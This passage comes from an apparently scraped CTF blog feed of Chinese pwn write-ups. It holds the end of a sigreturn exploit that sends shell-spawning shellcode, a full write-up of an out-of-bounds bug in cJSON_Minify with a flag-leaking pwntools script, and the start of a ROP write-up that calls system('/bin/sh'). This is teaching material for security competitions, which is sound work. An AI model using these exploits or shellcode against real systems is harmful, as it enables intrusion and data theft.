'syscall' instruction</span></span><br><span class="line"><span class="string">    p64(0x0000000000000202),   # EFLAGS</span></span><br><span class="line"><span class="string">    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # ERR</span></span><br><span class="line"><span class="string">    p64(0x0000000000000001),   # TrapNo</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # Old-Mask</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # CR2</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # fpstate = NULL</span></span><br><span class="line"><span class="string">    p64(0x000000000000000e),   # reserved</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_sigmask</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x1a0</span>+p64(<span class="number">0x000000000400108</span><span class="number">-0x50</span>)+p64(<span class="number">0x0000000004000BA</span>)+p64(<span class="number">0x0000000004000B5</span>)+p64(<span class="number">0x0000000000000007</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000ffff00000000</span>)+p64(<span class="number">0x0000000000000000</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'b'</span>*<span class="number">0x10</span>+<span class="string">'c'</span>*<span class="number">8</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x600100</span>)+<span class="string">'q'</span>*<span class="number">8</span>+<span class="string">'y'</span>*<span class="number">8</span>+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x600100</span>)+p64(<span class="number">0x0000000004000CB</span>)+p64(<span class="number">0x0000000000000202</span>)+p64(<span class="number">0x002b000000000033</span>)+ p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000001</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x000000000000000e</span>))</span><br><span class="line">sleep(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*(<span class="number">0xf</span><span class="number">-1</span>))</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'8'</span>*<span class="number">64</span>+p64(<span class="number">0x600148</span>+<span class="number">8</span>)+p64(<span class="number">0</span>)+(asm(shellcraft.sh())))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>sctf2021-pwn-dataleak-wp</title>
    <link href="lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/"/>
    <id>lexsd6.github.io/2021/12/31/sctf2021-pwn-dataleak/</id>
    <published>2021-12-31T07:16:18.287Z</published>
    <updated>2021-12-31T09:26:55.138Z</updated>
    
    <content type="html"><![CDATA[<p>周末有事去了，等缓过来只搞个这个题的文件….<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    '/home/wlz/my_code/sctf_21/pwn_dataleak/src2ctfer/cmake-build-debug'</span><br></pre></td></tr></table></figure><p>分析环境，发现题目没有开启canary,并且自带一个so文件。</p><p>分析主程序流程发现逻辑很简单，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = '_si_siht';</span><br><span class="line">    v9 = '_ni_atad';</span><br><span class="line">    v10 = 'revres';</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    buf = <span class="number">0L</span>L;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    v6 = <span class="number">0L</span>L;</span><br><span class="line">    v7 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xE</span>uLL);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v6, <span class="number">0xE</span>uLL);</span><br><span class="line">    cJSON_Minify(&amp;buf, &amp;v6);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, &amp;v6, <span class="number">0xB</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次输入长度达0xe的字符串，然后放入<code>cJSON_Minify</code>函数进行处理。</p><p><code>cJSON_Minify</code>函数在so文件中源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">cJSON_Minify</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// cl</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *str_a1; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *last; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v20; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  str_a1 = a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  last = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *str_a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *str_a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\t'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\r'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'\n'</span>:</span><br><span class="line">          ++str_a1;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *str_a1 != <span class="string">'/'</span> || str_a1[<span class="number">1</span>] != <span class="string">'*'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *str_a1 == <span class="string">'"'</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v2 = str_a1;</span><br><span class="line">                v18 = str_a1 + <span class="number">1</span>;</span><br><span class="line">                v3 = *v2;</span><br><span class="line">                v4 = last;</span><br><span class="line">                v20 = (<span class="keyword">signed</span> __int64)(last + <span class="number">1</span>);</span><br><span class="line">                *v4 = v3;</span><br><span class="line">                <span class="keyword">while</span> ( *v18 &amp;&amp; *v18 != <span class="string">'"'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( *v18 == <span class="string">'\\'</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v5 = v18++;</span><br><span class="line">                    v6 = *v5;</span><br><span class="line">                    v7 = (_BYTE *)v20++;</span><br><span class="line">                    *v7 = v6;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v8 = v18++;</span><br><span class="line">                  v9 = *v8;</span><br><span class="line">                  v10 = (_BYTE *)v20++;</span><br><span class="line">                  *v10 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">                v11 = v18;</span><br><span class="line">                str_a1 = v18 + <span class="number">1</span>;</span><br><span class="line">                v12 = *v11;</span><br><span class="line">                v13 = (_BYTE *)v20;</span><br><span class="line">                last = (<span class="keyword">char</span> *)(v20 + <span class="number">1</span>);</span><br><span class="line">                *v13 = v12;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v14 = str_a1++;</span><br><span class="line">                v15 = *v14;</span><br><span class="line">                v16 = last++;</span><br><span class="line">                *v16 = v15;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">                ++str_a1;</span><br><span class="line">              str_a1 += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( *str_a1 &amp;&amp; *str_a1 != <span class="string">'\n'</span> )</span><br><span class="line">              ++str_a1;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = last;</span><br><span class="line">    *last = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输出处理后，第二次输入的字符串的前8位。</p><h2 id="漏洞点与利用"><a href="#漏洞点与利用" class="headerlink" title="漏洞点与利用"></a>漏洞点与利用</h2><p>这里在<code>cJSON_Minify</code>函数中有个两个问题，第一个是越界(即<code>cJSON_Minify</code>第89-92行）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">    ++str_a1;</span><br><span class="line">  str_a1 += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当字符串中有<code>\*</code>开头时，会不断遍历剩下字符直到遇到<code>\x00</code>或<code>*/</code>。但这里没有写仔细，如果遇到<code>*/</code>最后<code>str_a1 += 2;</code>是合理的但是遇到的是<code>\x00</code></p><p>就有越界的风险。</p><p>第二个问题是在对一般字符处理时（即<code>cJSON_Minify</code>第81-84行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v14 &#x3D; str_a1++;</span><br><span class="line">v15 &#x3D; *v14;</span><br><span class="line">v16 &#x3D; last++;</span><br><span class="line">*v16 &#x3D; v15;</span><br></pre></td></tr></table></figure><p>在对正常字符处理时，<code>cJSON_Minify</code>函数<code>str_a1</code>处的数据放入<code>last</code>处，在正常情况下，str_a1的位置和last的位置是一样的。但是如果触发了问题一中的越界，那么<code>str_a1</code>指向我们字符串为<code>\x00</code>的位置还要+1的地方,而last处的还指向字符串的’/‘字符的位置。达成了，越界写。</p><p>就这个题目而言，如果我们输入的字符分别为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">”xxxxxxxx/*oooo“ <span class="comment">#第一次的字符串</span></span><br><span class="line"></span><br><span class="line">”<span class="number">1234567890</span>qqqq” <span class="comment">#第二次字符串，v6</span></span><br></pre></td></tr></table></figure><p>那么，在处理前栈上的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx&#x2F;*oooo&quot;</span><br><span class="line">0x7ffc7f8d67bf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67c0: &quot;1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>在处理后，第一次字符串中的<code>/*oooo\x00</code>被替换成了第二个字符串中同等长度的字符<code>12345678</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67c7: &quot;890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>同时，若在第二次字符中还有 <code>/*</code>则将会在再次触发上面的步骤。</p><p>经过测试后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf： xxxxxxxxxxxx&#x2F;*   v6:1111&#x2F;*qqqqqqqq</span><br><span class="line"></span><br><span class="line">buf： xxxxx&#x2F;*1111111    v6: &#x2F;*qqqqqqqqqqqq</span><br></pre></td></tr></table></figure><p>正好4次输入正好可以泄露出flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/29 09:59:15</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./cJSON_PWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> Nonex</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">x=<span class="string">'s/*aaaaaaa'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=<span class="string">'/*'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'1111/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">x=<span class="string">'/*1111111'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记-信息收集"><a href="#后记-信息收集" class="headerlink" title="后记-信息收集"></a>后记-信息收集</h2><p>在查阅这个题资料时发现这原理是一个信息收集题，orw…</p><p>搜索程序的文件可以看一个github项目：</p><p><img src="image-20211231165136223.png" alt="image-20211231165136223"></p><p>这里就一个看到一个security报告。</p><p><img src="image-20211231165647957.png" alt="image-20211231165647957"></p><p>这里就提到<code>/*</code>的报告，链接<a href="https://github.com/DaveGamble/cJSON/issues/338" target="_blank" rel="noopener">https://github.com/DaveGamble/cJSON/issues/338</a></p><p><img src="image-20211231170448565.png" alt="image-20211231170448565"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个签到都这么有意思，其他题一定也都很有趣吧….</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末有事去了，等缓过来只搞个这个题的文件….</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>东软2021CTF--PWN--wp</title>
    <link href="lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/"/>
    <id>lexsd6.github.io/2021/12/04/%E4%B8%9C%E8%BD%AF/</id>
    <published>2021-12-04T02:18:12.000Z</published>
    <updated>2021-12-10T13:59:17.572Z</updated>
    
    <content type="html"><![CDATA[<p>第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……<a id="more"></a></p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><p>经过动态gdb发现，如果我们通过栈溢出劫持<code>main</code>重新运行，那么第二次输入的将放在第一次输入数据的上方。这样通过两次合理输入构造，我们可控的输入空间扩大。就可以在泄露出libc的真实地址的同时，然后<code>mian</code>程序流中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffbfe39330 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7fffbfe39338 —▸ 0x404028 (read@got.plt) —▸ 0x7f7373e188b0 (read) ◂— mov    eax, dword ptr fs:[0x18]</span><br><span class="line">02:0010│     0x7fffbfe39340 —▸ 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]</span><br><span class="line">03:0018│     0x7fffbfe39348 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">04:0020│     0x7fffbfe39350 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7fffbfe39358 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">06:0030│     0x7fffbfe39360 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">07:0038│     0x7fffbfe39368 ◂— 0x0</span><br></pre></td></tr></table></figure><p>再通过LibcSearcher 找到system 和 /bin/sh 的真实地址，然后构造rop链get shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffc354e6078 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7ffc354e6080 —▸ 0x7f6ad64b269b ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffc354e6088 —▸ 0x7f6ad6372e10 (system) ◂— test   rdi, rdi</span><br><span class="line">03:0018│     0x7ffc354e6090 ◂— 0x0</span><br><span class="line">04:0020│     0x7ffc354e6098 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7ffc354e60a0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">06:0030│     0x7ffc354e60a8 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">07:0038│     0x7ffc354e60b0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 17:36:49</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span 